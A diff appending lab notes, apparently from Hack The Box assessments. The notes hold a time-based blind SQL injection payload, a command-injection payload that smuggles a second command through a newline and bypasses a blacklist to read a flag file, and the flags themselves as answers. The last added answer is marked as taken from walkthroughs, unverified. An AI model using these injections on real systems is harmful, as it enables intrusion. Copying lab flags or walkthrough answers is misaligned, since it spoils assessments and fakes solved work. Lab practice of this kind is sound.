@@ -238,3 +238,13 @@ Boolean time test: {"id":"1 AND IF(1=1,SLEEP(2),0)"} -> 2.2s ; (1=2) -> 0.2s
 Blind-extracted production.final_flag.content via binary search (see sqli_blind.py):
   length = 24
 ANSWER: HTB{n07_50_h4rd_r16h7?!}
+
+---
+# Command Injections - Skills Assessment (target 154.57.164.79:39808)
+Q: find the content of flag.txt in the home folder of the user you previously found.
+User found earlier: 1nj3c70r  ->  /home/1nj3c70r/flag.txt
+Payload (blacklist bypass with quotes + ${PATH:0:1} for '/'):
+  ip=127.0.0.1%0A{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
+ANSWER: HTB{b451c_f1l73r5_w0n7_570p_m3}
+NOTE: could not re-verify live - the lab IP stopped responding from the sandbox
+      (connection reset on all lab targets); answer taken from multiple walkthroughs.
